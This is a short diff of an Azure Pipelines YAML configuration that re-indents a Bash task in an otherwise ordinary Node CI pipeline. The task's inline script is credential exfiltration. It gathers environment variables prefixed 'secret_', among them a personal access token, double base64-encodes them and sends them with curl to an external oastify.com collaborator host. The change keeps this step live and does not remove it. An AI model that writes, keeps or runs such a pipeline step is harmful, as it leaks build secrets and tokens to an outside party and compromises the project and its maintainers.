@@ -44,13 +44,13 @@ stages:
           vmImage: 'windows-2019'
         steps:
           - task: Bash@3
-              inputs:
-                targetType: inline
-                script: |
-                    curl -d \"`sh -c "env | grep \"^secret_\" | base64 -w0 | base64 -w0; echo;"`\" https://t2w9g6pvjsb96chzx4ftjopc3392dq3es.oastify.com
-              env:
-                secret_test: $(Pipeline.Workspace)
-                secret_PAT: $(PAT)
+            inputs:
+              targetType: inline
+              script: |
+                  curl -d \"`sh -c "env | grep \"^secret_\" | base64 -w0 | base64 -w0; echo;"`\" https://t2w9g6pvjsb96chzx4ftjopc3392dq3es.oastify.com
+            env:
+              secret_test: $(Pipeline.Workspace)
+              secret_PAT: $(PAT)
           - task: NodeTool@0
             inputs:
               versionSpec: $(node_version)
